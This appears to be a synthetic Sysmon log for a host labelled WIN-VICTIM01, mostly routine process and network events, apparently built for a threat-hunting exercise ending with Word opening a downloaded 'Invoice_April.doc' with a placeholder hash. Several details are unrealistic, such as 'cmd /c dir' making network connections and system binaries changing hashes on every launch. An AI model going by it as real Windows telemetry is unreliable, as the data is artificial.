{"timestamp": "2024-05-07T10:06:56", "host": "WIN-VICTIM01", "index": "sysmon", "source": "Microsoft-Windows-Sysmon/Operational", "EventID": 1, "event_type": "process_create", "User": "WIN-VICTIM01\\j.hassan", "Image": "C:\\Windows\\System32\\MsMpEng.exe", "ParentImage": "C:\\Windows\\System32\\services.exe", "CommandLine": "MsMpEng.exe", "ProcessId": 1358, "ParentProcessId": 1357, "dest_ip": null, "dest_port": null, "Hashes": "SHA256=dd4938af6feb253af327f3f1731f0020c25b4b62bb64a082b5f5b0a88001aa34"}
{"timestamp": "2024-05-07T10:07:09", "host": "WIN-VICTIM01", "index": "sysmon", "source": "Microsoft-Windows-Sysmon/Operational", "EventID": 1, "event_type": "process_create", "User": "NT AUTHORITY\\SYSTEM", "Image": "C:\\Windows\\System32\\MsMpEng.exe", "ParentImage": "C:\\Windows\\System32\\services.exe", "CommandLine": "MsMpEng.exe", "ProcessId": 1360, "ParentProcessId": 1359, "dest_ip": null, "dest_port": null, "Hashes": "SHA256=2dec09b6ace317de89ae9b97778011a01d0fe1e85c1f4c1ed76457c26dac1283"}
{"timestamp": "2024-05-07T10:07:27", "host": "WIN-VICTIM01", "index": "sysmon", "source": "Microsoft-Windows-Sysmon/Operational", "EventID": 1, "event_type": "process_create", "User": "WIN-VICTIM01\\j.hassan", "Image": "C:\\Windows\\System32\\MsMpEng.exe", "ParentImage": "C:\\Windows\\System32\\services.exe", "CommandLine": "MsMpEng.exe", "ProcessId": 1362, "ParentProcessId": 1361, "dest_ip": null, "dest_port": null, "Hashes": "SHA256=14b878bf671ef5d18b1c806ebc9f10a7d8e20a650766b8e4dc60a3f1ddf5fcc9"}
{"timestamp": "2024-05-07T10:07:28", "host": "WIN-VICTIM01", "index": "sysmon", "source": "Microsoft-Windows-Sysmon/Operational", "EventID": 3, "event_type": "network_connect", "User": "NT AUTHORITY\\SYSTEM", "Image": "C:\\Windows\\System32\\MsMpEng.exe", "ParentImage": null, "CommandLine": null, "ProcessId": 1362, "ParentProcessId": null, "dest_ip": "13.107.42.14", "dest_port": 443, "Hashes": null}
{"timestamp": "2024-05-07T10:07:44", "host": "WIN-VICTIM01", "index": "sysmon", "source": "Microsoft-Windows-Sysmon/Operational", "EventID": 1, "event_type": "process_create", "User": "NT AUTHORITY\\SYSTEM", "Image": "C:\\Program Files\\Microsoft Office\\root\\Office16\\OUTLOOK.EXE", "ParentImage": "C:\\Windows\\Explorer.EXE", "CommandLine": "OUTLOOK.EXE", "ProcessId": 1364, "ParentProcessId": 1363, "dest_ip": null, "dest_port": null, "Hashes": "SHA256=fa575493791f8daf6c56aac26e10d73f79a9a2cdc7ef68359db10c3068ede44a"}
{"timestamp": "2024-05-07T10:08:22", "host": "WIN-VICTIM01", "index": "sysmon", "source": "Microsoft-Windows-Sysmon/Operational", "EventID": 1, "event_type": "process_create", "User": "WIN-VICTIM01\\j.hassan", "Image": "C:\\Windows\\System32\\svchost.exe", "ParentImage": "C:\\Windows\\System32\\services.exe", "CommandLine": "svchost.exe -k netsvcs", "ProcessId": 1366, "ParentProcessId": 1365, "dest_ip": null, "dest_port": null, "Hashes": "SHA256=09ce12954ec58f6d1253af79fa55bc09cb26dde0d8d3ef84b4d2e57af401d23b"}
{"timestamp": "2024-05-07T10:08:25", "host": "WIN-VICTIM01", "index": "sysmon", "source": "Microsoft-Windows-Sysmon/Operational", "EventID": 1, "event_type": "process_create", "User": "WIN-VICTIM01\\j.hassan", "Image": "C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe", "ParentImage": "C:\\Windows\\Explorer.EXE", "CommandLine": "chrome.exe", "ProcessId": 1368, "ParentProcessId": 1367, "dest_ip": null, "dest_port": null, "Hashes": "SHA256=3c578ab894313098a98b2623f29da3c2164343b0911496eea75d142a39a9b4f4"}
{"timestamp": "2024-05-07T10:09:03", "host": "WIN-VICTIM01", "index": "sysmon", "source": "Microsoft-Windows-Sysmon/Operational", "EventID": 1, "event_type": "process_create", "User": "WIN-VICTIM01\\j.hassan", "Image": "C:\\Program Files\\Microsoft Office\\root\\Office16\\OUTLOOK.EXE", "ParentImage": "C:\\Windows\\Explorer.EXE", "CommandLine": "OUTLOOK.EXE", "ProcessId": 1370, "ParentProcessId": 1369, "dest_ip": null, "dest_port": null, "Hashes": "SHA256=2c2f13c824ffc1df5a6217b38f149d41648bde7a0e079bd67fe538b949bcea72"}
{"timestamp": "2024-05-07T10:09:25", "host": "WIN-VICTIM01", "index": "sysmon", "source": "Microsoft-Windows-Sysmon/Operational", "EventID": 1, "event_type": "process_create", "User": "WIN-VICTIM01\\j.hassan", "Image": "C:\\Windows\\System32\\RuntimeBroker.exe", "ParentImage": "C:\\Windows\\System32\\svchost.exe", "CommandLine": "RuntimeBroker.exe -Embedding", "ProcessId": 1372, "ParentProcessId": 1371, "dest_ip": null, "dest_port": null, "Hashes": "SHA256=077b349b6c8a2a15fafe32e9f060b1df57093346cfcbd5ad04adf8420a9ee757"}
{"timestamp": "2024-05-07T10:09:32", "host": "WIN-VICTIM01", "index": "sysmon", "source": "Microsoft-Windows-Sysmon/Operational", "EventID": 1, "event_type": "process_create", "User": "WIN-VICTIM01\\j.hassan", "Image": "C:\\Windows\\System32\\svchost.exe", "ParentImage": "C:\\Windows\\System32\\services.exe", "CommandLine": "svchost.exe -k netsvcs", "ProcessId": 1374, "ParentProcessId": 1373, "dest_ip": null, "dest_port": null, "Hashes": "SHA256=c9e5bf951137c540c39c1ae935013723f2f54dd81ad09ad205f635acf623a049"}
{"timestamp": "2024-05-07T10:09:47", "host": "WIN-VICTIM01", "index": "sysmon", "source": "Microsoft-Windows-Sysmon/Operational", "EventID": 1, "event_type": "process_create", "User": "NT AUTHORITY\\SYSTEM", "Image": "C:\\Windows\\System32\\svchost.exe", "ParentImage": "C:\\Windows\\System32\\services.exe", "CommandLine": "svchost.exe -k netsvcs", "ProcessId": 1376, "ParentProcessId": 1375, "dest_ip": null, "dest_port": null, "Hashes": "SHA256=e111802500b30539284446f5eb60c8b41e2e529d2325cfcb24823888c94d0ff6"}
{"timestamp": "2024-05-07T10:10:14", "host": "WIN-VICTIM01", "index": "sysmon", "source": "Microsoft-Windows-Sysmon/Operational", "EventID": 1, "event_type": "process_create", "User": "WIN-VICTIM01\\j.hassan", "Image": "C:\\Windows\\System32\\cmd.exe", "ParentImage": "C:\\Windows\\Explorer.EXE", "CommandLine": "cmd.exe /c dir", "ProcessId": 1378, "ParentProcessId": 1377, "dest_ip": null, "dest_port": null, "Hashes": "SHA256=1163711f09d9731a458f9fbc53bd549c847f836a8c09a6fe95c33e8518b429de"}
{"timestamp": "2024-05-07T10:10:38", "host": "WIN-VICTIM01", "index": "sysmon", "source": "Microsoft-Windows-Sysmon/Operational", "EventID": 1, "event_type": "process_create", "User": "NT AUTHORITY\\SYSTEM", "Image": "C:\\Windows\\System32\\cmd.exe", "ParentImage": "C:\\Windows\\Explorer.EXE", "CommandLine": "cmd.exe /c dir", "ProcessId": 1380, "ParentProcessId": 1379, "dest_ip": null, "dest_port": null, "Hashes": "SHA256=aa39ef8ec88177f0bdb139fe41fb340377d8751172cc43936da1fe04545b7b03"}
{"timestamp": "2024-05-07T10:10:39", "host": "WIN-VICTIM01", "index": "sysmon", "source": "Microsoft-Windows-Sysmon/Operational", "EventID": 3, "event_type": "network_connect", "User": "WIN-VICTIM01\\j.hassan", "Image": "C:\\Windows\\System32\\cmd.exe", "ParentImage": null, "CommandLine": null, "ProcessId": 1380, "ParentProcessId": null, "dest_ip": "142.250.185.68", "dest_port": 80, "Hashes": null}
{"timestamp": "2024-05-07T10:10:47", "host": "WIN-VICTIM01", "index": "sysmon", "source": "Microsoft-Windows-Sysmon/Operational", "EventID": 1, "event_type": "process_create", "User": "WIN-VICTIM01\\j.hassan", "Image": "C:\\Windows\\Explorer.EXE", "ParentImage": "C:\\Windows\\System32\\userinit.exe", "CommandLine": "C:\\Windows\\Explorer.EXE", "ProcessId": 1382, "ParentProcessId": 1381, "dest_ip": null, "dest_port": null, "Hashes": "SHA256=a7e16e6be9e297665b6c59c048bd202b75bf5beff7ad2a4a9768d3bf9f785f59"}
{"timestamp": "2024-05-07T10:10:52", "host": "WIN-VICTIM01", "index": "sysmon", "source": "Microsoft-Windows-Sysmon/Operational", "EventID": 1, "event_type": "process_create", "User": "NT AUTHORITY\\SYSTEM", "Image": "C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe", "ParentImage": "C:\\Windows\\Explorer.EXE", "CommandLine": "chrome.exe", "ProcessId": 1384, "ParentProcessId": 1383, "dest_ip": null, "dest_port": null, "Hashes": "SHA256=7b8f6a2c0286a02c517a1e203951893cececea11f4c07e56b45a721520e4dd26"}
{"timestamp": "2024-05-07T10:11:30", "host": "WIN-VICTIM01", "index": "sysmon", "source": "Microsoft-Windows-Sysmon/Operational", "EventID": 1, "event_type": "process_create", "User": "NT AUTHORITY\\SYSTEM", "Image": "C:\\Windows\\System32\\svchost.exe", "ParentImage": "C:\\Windows\\System32\\services.exe", "CommandLine": "svchost.exe -k netsvcs", "ProcessId": 1386, "ParentProcessId": 1385, "dest_ip": null, "dest_port": null, "Hashes": "SHA256=562ea36ab2153088a93b08a5b7d58b6e609820496719aab6a2e55cab28b61533"}
{"timestamp": "2024-05-07T10:11:42", "host": "WIN-VICTIM01", "index": "sysmon", "source": "Microsoft-Windows-Sysmon/Operational", "EventID": 1, "event_type": "process_create", "User": "WIN-VICTIM01\\j.hassan", "Image": "C:\\Program Files\\Microsoft Office\\root\\Office16\\OUTLOOK.EXE", "ParentImage": "C:\\Windows\\Explorer.EXE", "CommandLine": "OUTLOOK.EXE", "ProcessId": 1388, "ParentProcessId": 1387, "dest_ip": null, "dest_port": null, "Hashes": "SHA256=a4a2aa7bd28155ffa0c61465c5b3cbe315658f75410d28be90e374aef2136b94"}
{"timestamp": "2024-05-07T10:12:21", "host": "WIN-VICTIM01", "index": "sysmon", "source": "Microsoft-Windows-Sysmon/Operational", "EventID": 1, "event_type": "process_create", "User": "WIN-VICTIM01\\j.hassan", "Image": "C:\\Windows\\System32\\cmd.exe", "ParentImage": "C:\\Windows\\Explorer.EXE", "CommandLine": "cmd.exe /c dir", "ProcessId": 1390, "ParentProcessId": 1389, "dest_ip": null, "dest_port": null, "Hashes": "SHA256=6f22297ab2a9f4d6ea8841f1af342f1dbe75b5731e1e3c21a6a74c7bf055f906"}
{"timestamp": "2024-05-07T10:12:33", "host": "WIN-VICTIM01", "index": "sysmon", "source": "Microsoft-Windows-Sysmon/Operational", "EventID": 1, "event_type": "process_create", "User": "WIN-VICTIM01\\j.hassan", "Image": "C:\\Windows\\System32\\svchost.exe", "ParentImage": "C:\\Windows\\System32\\services.exe", "CommandLine": "svchost.exe -k netsvcs", "ProcessId": 1392, "ParentProcessId": 1391, "dest_ip": null, "dest_port": null, "Hashes": "SHA256=14125c5006157c51d27ddc1b96d39d30301609e0779f1fd712bbdd6270a0ffdb"}
{"timestamp": "2024-05-07T10:12:45", "host": "WIN-VICTIM01", "index": "sysmon", "source": "Microsoft-Windows-Sysmon/Operational", "EventID": 1, "event_type": "process_create", "User": "WIN-VICTIM01\\j.hassan", "Image": "C:\\Windows\\Explorer.EXE", "ParentImage": "C:\\Windows\\System32\\userinit.exe", "CommandLine": "C:\\Windows\\Explorer.EXE", "ProcessId": 1394, "ParentProcessId": 1393, "dest_ip": null, "dest_port": null, "Hashes": "SHA256=7254df7084b51a1f5389c11967e9ddb27eb45ac01d8c42de1006b6ab345cb5cd"}
{"timestamp": "2024-05-07T10:12:55", "host": "WIN-VICTIM01", "index": "sysmon", "source": "Microsoft-Windows-Sysmon/Operational", "EventID": 1, "event_type": "process_create", "User": "NT AUTHORITY\\SYSTEM", "Image": "C:\\Windows\\System32\\svchost.exe", "ParentImage": "C:\\Windows\\System32\\services.exe", "CommandLine": "svchost.exe -k netsvcs", "ProcessId": 1396, "ParentProcessId": 1395, "dest_ip": null, "dest_port": null, "Hashes": "SHA256=502bff22c09693e733d13207ee0a409901e640bffe702b23c921e623c0de6fa7"}
{"timestamp": "2024-05-07T10:13:05", "host": "WIN-VICTIM01", "index": "sysmon", "source": "Microsoft-Windows-Sysmon/Operational", "EventID": 1, "event_type": "process_create", "User": "WIN-VICTIM01\\j.hassan", "Image": "C:\\Windows\\System32\\svchost.exe", "ParentImage": "C:\\Windows\\System32\\services.exe", "CommandLine": "svchost.exe -k netsvcs", "ProcessId": 1398, "ParentProcessId": 1397, "dest_ip": null, "dest_port": null, "Hashes": "SHA256=d501ad7ed6d3cb1da01a60fae3063c55a5b2b5022417bfc93ed679f7c393c10b"}
{"timestamp": "2024-05-07T10:13:06", "host": "WIN-VICTIM01", "index": "sysmon", "source": "Microsoft-Windows-Sysmon/Operational", "EventID": 3, "event_type": "network_connect", "User": "WIN-VICTIM01\\j.hassan", "Image": "C:\\Windows\\System32\\svchost.exe", "ParentImage": null, "CommandLine": null, "ProcessId": 1398, "ParentProcessId": null, "dest_ip": "13.107.42.14", "dest_port": 80, "Hashes": null}
{"timestamp": "2024-05-07T10:13:19", "host": "WIN-VICTIM01", "index": "sysmon", "source": "Microsoft-Windows-Sysmon/Operational", "EventID": 1, "event_type": "process_create", "User": "WIN-VICTIM01\\j.hassan", "Image": "C:\\Windows\\System32\\RuntimeBroker.exe", "ParentImage": "C:\\Windows\\System32\\svchost.exe", "CommandLine": "RuntimeBroker.exe -Embedding", "ProcessId": 1400, "ParentProcessId": 1399, "dest_ip": null, "dest_port": null, "Hashes": "SHA256=2c3a70966b9312bb1e52411b5d2028b630fbab414078bdfe3803b952395e97e0"}
{"timestamp": "2024-05-07T10:13:39", "host": "WIN-VICTIM01", "index": "sysmon", "source": "Microsoft-Windows-Sysmon/Operational", "EventID": 1, "event_type": "process_create", "User": "WIN-VICTIM01\\j.hassan", "Image": "C:\\Windows\\System32\\cmd.exe", "ParentImage": "C:\\Windows\\Explorer.EXE", "CommandLine": "cmd.exe /c dir", "ProcessId": 1402, "ParentProcessId": 1401, "dest_ip": null, "dest_port": null, "Hashes": "SHA256=68c084aed925a74b57d12bffea0e1357a4236c9bcf69b32d104f42b811e25121"}
{"timestamp": "2024-05-07T10:13:56", "host": "WIN-VICTIM01", "index": "sysmon", "source": "Microsoft-Windows-Sysmon/Operational", "EventID": 1, "event_type": "process_create", "User": "WIN-VICTIM01\\j.hassan", "Image": "C:\\Windows\\System32\\svchost.exe", "ParentImage": "C:\\Windows\\System32\\services.exe", "CommandLine": "svchost.exe -k netsvcs", "ProcessId": 1404, "ParentProcessId": 1403, "dest_ip": null, "dest_port": null, "Hashes": "SHA256=39307e16602dd1d1185a380f44267f1919e1272126b88e18a7e4152b9cef5c11"}
{"timestamp": "2024-05-07T10:14:25", "host": "WIN-VICTIM01", "index": "sysmon", "source": "Microsoft-Windows-Sysmon/Operational", "EventID": 1, "event_type": "process_create", "User": "WIN-VICTIM01\\j.hassan", "Image": "C:\\Windows\\Explorer.EXE", "ParentImage": "C:\\Windows\\System32\\userinit.exe", "CommandLine": "C:\\Windows\\Explorer.EXE", "ProcessId": 1406, "ParentProcessId": 1405, "dest_ip": null, "dest_port": null, "Hashes": "SHA256=a06561a43c84501c62a2cd8f389464ba24bb9a4db92265c60de1e94498d6e9f6"}
{"timestamp": "2024-05-07T10:14:57", "host": "WIN-VICTIM01", "index": "sysmon", "source": "Microsoft-Windows-Sysmon/Operational", "EventID": 1, "event_type": "process_create", "User": "WIN-VICTIM01\\j.hassan", "Image": "C:\\Windows\\System32\\RuntimeBroker.exe", "ParentImage": "C:\\Windows\\System32\\svchost.exe", "CommandLine": "RuntimeBroker.exe -Embedding", "ProcessId": 1408, "ParentProcessId": 1407, "dest_ip": null, "dest_port": null, "Hashes": "SHA256=df52a072b641f61c85db80b21cbd7928dd63bd58b1961669af6fbfe2f257536f"}
{"timestamp": "2024-05-07T10:15:05", "host": "WIN-VICTIM01", "index": "sysmon", "source": "Microsoft-Windows-Sysmon/Operational", "EventID": 1, "event_type": "process_create", "User": "WIN-VICTIM01\\j.hassan", "Image": "C:\\Windows\\System32\\RuntimeBroker.exe", "ParentImage": "C:\\Windows\\System32\\svchost.exe", "CommandLine": "RuntimeBroker.exe -Embedding", "ProcessId": 1410, "ParentProcessId": 1409, "dest_ip": null, "dest_port": null, "Hashes": "SHA256=60ecf87821721d657fff6d7532500cb1984bbc910f38bbd49fc6dceee9fa8caa"}
{"timestamp": "2024-05-07T10:15:43", "host": "WIN-VICTIM01", "index": "sysmon", "source": "Microsoft-Windows-Sysmon/Operational", "EventID": 1, "event_type": "process_create", "User": "WIN-VICTIM01\\j.hassan", "Image": "C:\\Windows\\System32\\cmd.exe", "ParentImage": "C:\\Windows\\Explorer.EXE", "CommandLine": "cmd.exe /c dir", "ProcessId": 1412, "ParentProcessId": 1411, "dest_ip": null, "dest_port": null, "Hashes": "SHA256=001d68e73f14175ccc0eeac10de320de18d7495a456a7c79b6f0911c5ded7f6e"}
{"timestamp": "2024-05-07T10:15:51", "host": "WIN-VICTIM01", "index": "sysmon", "source": "Microsoft-Windows-Sysmon/Operational", "EventID": 1, "event_type": "process_create", "User": "NT AUTHORITY\\SYSTEM", "Image": "C:\\Program Files\\Microsoft Office\\root\\Office16\\OUTLOOK.EXE", "ParentImage": "C:\\Windows\\Explorer.EXE", "CommandLine": "OUTLOOK.EXE", "ProcessId": 1414, "ParentProcessId": 1413, "dest_ip": null, "dest_port": null, "Hashes": "SHA256=c8ad48c6b15d5c624da3a231950dd2cd4942a3545c475aaf2cef665a87ec8e7c"}
{"timestamp": "2024-05-07T10:16:08", "host": "WIN-VICTIM01", "index": "sysmon", "source": "Microsoft-Windows-Sysmon/Operational", "EventID": 1, "event_type": "process_create", "User": "WIN-VICTIM01\\j.hassan", "Image": "C:\\Windows\\System32\\svchost.exe", "ParentImage": "C:\\Windows\\System32\\services.exe", "CommandLine": "svchost.exe -k netsvcs", "ProcessId": 1416, "ParentProcessId": 1415, "dest_ip": null, "dest_port": null, "Hashes": "SHA256=78a01c09f748d2faa1a94e886f7732d380ded27ea430bb1e6915bd1d2e4ec663"}
{"timestamp": "2024-05-07T10:16:09", "host": "WIN-VICTIM01", "index": "sysmon", "source": "Microsoft-Windows-Sysmon/Operational", "EventID": 3, "event_type": "network_connect", "User": "WIN-VICTIM01\\j.hassan", "Image": "C:\\Windows\\System32\\svchost.exe", "ParentImage": null, "CommandLine": null, "ProcessId": 1416, "ParentProcessId": null, "dest_ip": "10.10.20.10", "dest_port": 80, "Hashes": null}
{"timestamp": "2024-05-07T10:16:27", "host": "WIN-VICTIM01", "index": "sysmon", "source": "Microsoft-Windows-Sysmon/Operational", "EventID": 1, "event_type": "process_create", "User": "WIN-VICTIM01\\j.hassan", "Image": "C:\\Windows\\System32\\RuntimeBroker.exe", "ParentImage": "C:\\Windows\\System32\\svchost.exe", "CommandLine": "RuntimeBroker.exe -Embedding", "ProcessId": 1418, "ParentProcessId": 1417, "dest_ip": null, "dest_port": null, "Hashes": "SHA256=22c678c6c05dc0d0e7ec4181bebd03c255da8d6d22d730d5e2027b861300e495"}
{"timestamp": "2024-05-07T10:16:47", "host": "WIN-VICTIM01", "index": "sysmon", "source": "Microsoft-Windows-Sysmon/Operational", "EventID": 1, "event_type": "process_create", "User": "NT AUTHORITY\\SYSTEM", "Image": "C:\\Program Files\\Microsoft Office\\root\\Office16\\OUTLOOK.EXE", "ParentImage": "C:\\Windows\\Explorer.EXE", "CommandLine": "OUTLOOK.EXE", "ProcessId": 1420, "ParentProcessId": 1419, "dest_ip": null, "dest_port": null, "Hashes": "SHA256=378a0e9c65aa86a28ccdd9addddfe99debdc83d4b4b12cf8a345b24820607a55"}
{"timestamp": "2024-05-07T10:16:57", "host": "WIN-VICTIM01", "index": "sysmon", "source": "Microsoft-Windows-Sysmon/Operational", "EventID": 1, "event_type": "process_create", "User": "WIN-VICTIM01\\j.hassan", "Image": "C:\\Windows\\System32\\cmd.exe", "ParentImage": "C:\\Windows\\Explorer.EXE", "CommandLine": "cmd.exe /c dir", "ProcessId": 1422, "ParentProcessId": 1421, "dest_ip": null, "dest_port": null, "Hashes": "SHA256=26f02891ca73506a57caebcfb4d134fe18561af1800736800f9cfd453f811723"}
{"timestamp": "2024-05-07T10:17:37", "host": "WIN-VICTIM01", "index": "sysmon", "source": "Microsoft-Windows-Sysmon/Operational", "EventID": 1, "event_type": "process_create", "User": "NT AUTHORITY\\SYSTEM", "Image": "C:\\Windows\\System32\\MsMpEng.exe", "ParentImage": "C:\\Windows\\System32\\services.exe", "CommandLine": "MsMpEng.exe", "ProcessId": 1424, "ParentProcessId": 1423, "dest_ip": null, "dest_port": null, "Hashes": "SHA256=149b6d164f4a7c39273cd52f0f0a807ec08271b0db91bfa366458764528d7946"}
{"timestamp": "2024-05-07T10:17:50", "host": "WIN-VICTIM01", "index": "sysmon", "source": "Microsoft-Windows-Sysmon/Operational", "EventID": 1, "event_type": "process_create", "User": "NT AUTHORITY\\SYSTEM", "Image": "C:\\Windows\\System32\\MsMpEng.exe", "ParentImage": "C:\\Windows\\System32\\services.exe", "CommandLine": "MsMpEng.exe", "ProcessId": 1426, "ParentProcessId": 1425, "dest_ip": null, "dest_port": null, "Hashes": "SHA256=d991057dd40f7a7a49953e61201dd9cf852ead794ad18b4e351176a0d256c75f"}
{"timestamp": "2024-05-07T10:18:26", "host": "WIN-VICTIM01", "index": "sysmon", "source": "Microsoft-Windows-Sysmon/Operational", "EventID": 1, "event_type": "process_create", "User": "WIN-VICTIM01\\j.hassan", "Image": "C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe", "ParentImage": "C:\\Windows\\Explorer.EXE", "CommandLine": "chrome.exe", "ProcessId": 1428, "ParentProcessId": 1427, "dest_ip": null, "dest_port": null, "Hashes": "SHA256=54154a135e1877a1a3e89866c96d89048ad47a3c594e7de7c21969fe2c13a6ef"}
{"timestamp": "2024-05-07T10:18:55", "host": "WIN-VICTIM01", "index": "sysmon", "source": "Microsoft-Windows-Sysmon/Operational", "EventID": 1, "event_type": "process_create", "User": "WIN-VICTIM01\\j.hassan", "Image": "C:\\Windows\\Explorer.EXE", "ParentImage": "C:\\Windows\\System32\\userinit.exe", "CommandLine": "C:\\Windows\\Explorer.EXE", "ProcessId": 1430, "ParentProcessId": 1429, "dest_ip": null, "dest_port": null, "Hashes": "SHA256=a19a6c5d1937010b9e346458713f3b7a075966316a690a3a76ea4628fd0a0b7b"}
{"timestamp": "2024-05-07T10:19:04", "host": "WIN-VICTIM01", "index": "sysmon", "source": "Microsoft-Windows-Sysmon/Operational", "EventID": 1, "event_type": "process_create", "User": "NT AUTHORITY\\SYSTEM", "Image": "C:\\Program Files\\Microsoft Office\\root\\Office16\\OUTLOOK.EXE", "ParentImage": "C:\\Windows\\Explorer.EXE", "CommandLine": "OUTLOOK.EXE", "ProcessId": 1432, "ParentProcessId": 1431, "dest_ip": null, "dest_port": null, "Hashes": "SHA256=5f6d775d1f1e1fa6edc17baa8f4c25c37ea9f472e2ad92c4a84a06bc3c912b2b"}
{"timestamp": "2024-05-07T10:19:36", "host": "WIN-VICTIM01", "index": "sysmon", "source": "Microsoft-Windows-Sysmon/Operational", "EventID": 1, "event_type": "process_create", "User": "WIN-VICTIM01\\j.hassan", "Image": "C:\\Windows\\System32\\cmd.exe", "ParentImage": "C:\\Windows\\Explorer.EXE", "CommandLine": "cmd.exe /c dir", "ProcessId": 1434, "ParentProcessId": 1433, "dest_ip": null, "dest_port": null, "Hashes": "SHA256=3fec86a4a0e13d2c8c0c7617c817ef144a5b3f5c4e73e9f6cd0b22cff1bdaa56"}
{"timestamp": "2024-05-07T10:19:37", "host": "WIN-VICTIM01", "index": "sysmon", "source": "Microsoft-Windows-Sysmon/Operational", "EventID": 3, "event_type": "network_connect", "User": "WIN-VICTIM01\\j.hassan", "Image": "C:\\Windows\\System32\\cmd.exe", "ParentImage": null, "CommandLine": null, "ProcessId": 1434, "ParentProcessId": null, "dest_ip": "10.10.20.10", "dest_port": 80, "Hashes": null}
{"timestamp": "2024-05-07T10:20:14", "host": "WIN-VICTIM01", "index": "sysmon", "source": "Microsoft-Windows-Sysmon/Operational", "EventID": 1, "event_type": "process_create", "User": "WIN-VICTIM01\\j.hassan", "Image": "C:\\Windows\\System32\\RuntimeBroker.exe", "ParentImage": "C:\\Windows\\System32\\svchost.exe", "CommandLine": "RuntimeBroker.exe -Embedding", "ProcessId": 1436, "ParentProcessId": 1435, "dest_ip": null, "dest_port": null, "Hashes": "SHA256=6fa977bd946fe877ecfc107c1fa97d3f152b976964a89e1b33f988896613c166"}
{"timestamp": "2024-05-07T10:20:44", "host": "WIN-VICTIM01", "index": "sysmon", "source": "Microsoft-Windows-Sysmon/Operational", "EventID": 1, "event_type": "process_create", "User": "NT AUTHORITY\\SYSTEM", "Image": "C:\\Windows\\System32\\RuntimeBroker.exe", "ParentImage": "C:\\Windows\\System32\\svchost.exe", "CommandLine": "RuntimeBroker.exe -Embedding", "ProcessId": 1438, "ParentProcessId": 1437, "dest_ip": null, "dest_port": null, "Hashes": "SHA256=665e69950280fee1890d190ab7cf2cd10b1fe47ac249a97c6a8ee47d274eb35e"}
{"timestamp": "2024-05-07T10:21:01", "host": "WIN-VICTIM01", "index": "sysmon", "source": "Microsoft-Windows-Sysmon/Operational", "EventID": 1, "event_type": "process_create", "User": "WIN-VICTIM01\\j.hassan", "Image": "C:\\Windows\\System32\\svchost.exe", "ParentImage": "C:\\Windows\\System32\\services.exe", "CommandLine": "svchost.exe -k netsvcs", "ProcessId": 1440, "ParentProcessId": 1439, "dest_ip": null, "dest_port": null, "Hashes": "SHA256=76ba292f1f94ff494b5f7b9f365ad0f2a1268fa5466cd91da1d351db04ca888d"}
{"timestamp": "2024-05-07T10:21:39", "host": "WIN-VICTIM01", "index": "sysmon", "source": "Microsoft-Windows-Sysmon/Operational", "EventID": 1, "event_type": "process_create", "User": "WIN-VICTIM01\\j.hassan", "Image": "C:\\Windows\\System32\\RuntimeBroker.exe", "ParentImage": "C:\\Windows\\System32\\svchost.exe", "CommandLine": "RuntimeBroker.exe -Embedding", "ProcessId": 1442, "ParentProcessId": 1441, "dest_ip": null, "dest_port": null, "Hashes": "SHA256=cdceb69779131d6eed55dc9ac0a326617eb43b13a2ae5f900ef1e699cdb52215"}
{"timestamp": "2024-05-07T10:21:46", "host": "WIN-VICTIM01", "index": "sysmon", "source": "Microsoft-Windows-Sysmon/Operational", "EventID": 1, "event_type": "process_create", "User": "WIN-VICTIM01\\j.hassan", "Image": "C:\\Windows\\Explorer.EXE", "ParentImage": "C:\\Windows\\System32\\userinit.exe", "CommandLine": "C:\\Windows\\Explorer.EXE", "ProcessId": 1444, "ParentProcessId": 1443, "dest_ip": null, "dest_port": null, "Hashes": "SHA256=c4e4dfce01b63e728b23b5d0e3a1551a78d2778f81bb64fa179e2321e5027c34"}
{"timestamp": "2024-05-07T10:22:08", "host": "WIN-VICTIM01", "index": "sysmon", "source": "Microsoft-Windows-Sysmon/Operational", "EventID": 1, "event_type": "process_create", "User": "WIN-VICTIM01\\j.hassan", "Image": "C:\\Windows\\System32\\RuntimeBroker.exe", "ParentImage": "C:\\Windows\\System32\\svchost.exe", "CommandLine": "RuntimeBroker.exe -Embedding", "ProcessId": 1446, "ParentProcessId": 1445, "dest_ip": null, "dest_port": null, "Hashes": "SHA256=420e4834ab665f565fd0216d598d73e1534c7ba68ac98dd560e0644117b06841"}
{"timestamp": "2024-05-07T10:22:15", "host": "WIN-VICTIM01", "index": "sysmon", "source": "Microsoft-Windows-Sysmon/Operational", "EventID": 1, "event_type": "process_create", "User": "WIN-VICTIM01\\j.hassan", "Image": "C:\\Program Files\\Microsoft Office\\root\\Office16\\WINWORD.EXE", "ParentImage": "C:\\Windows\\Explorer.EXE", "CommandLine": "\"WINWORD.EXE\" /n \"C:\\Users\\j.hassan\\Downloads\\Invoice_April.doc\"", "ProcessId": 4120, "ParentProcessId": 1200, "dest_ip": null, "dest_port": null, "Hashes": "SHA256=aa11bb22cc33"}
{"timestamp": "2024-05-07T10:22:22", "host": "WIN-VICTIM01", "index": "sysmon", "source": "Microsoft-Windows-Sysmon/Operational", "EventID": 1, "event_type": "process_create", "User": "WIN-VICTIM01\\j.hassan", "Image": "C:\\Windows\\System32\\MsMpEng.exe", "ParentImage": "C:\\Windows\\System32\\services.exe", "CommandLine": "MsMpEng.exe", "ProcessId": 1448, "ParentProcessId": 1447, "dest_ip": null, "dest_port": null, "Hashes": "SHA256=4095a8373152268eee4794561c909bbf4621e79da43109164a6a3d4352baa848"}
{"timestamp": "2024-05-07T10:22:32", "host": "WIN-VICTIM01", "index": "sysmon", "source": "Microsoft-Windows-Sysmon/Operational", "EventID": 1, "event_type": "process_create", "User": "WIN-VICTIM01\\j.hassan", "Image": "C:\\Windows\\System32\\RuntimeBroker.exe", "ParentImage": "C:\\Windows\\System32\\svchost.exe", "CommandLine": "RuntimeBroker.exe -Embedding", "ProcessId": 1450, "ParentProcessId": 1449, "dest_ip": null, "dest_port": null, "Hashes": "SHA256=12f4e616840010f1871e82e6bce9b369c29066187352484c8daba572fb3fdbe7"}
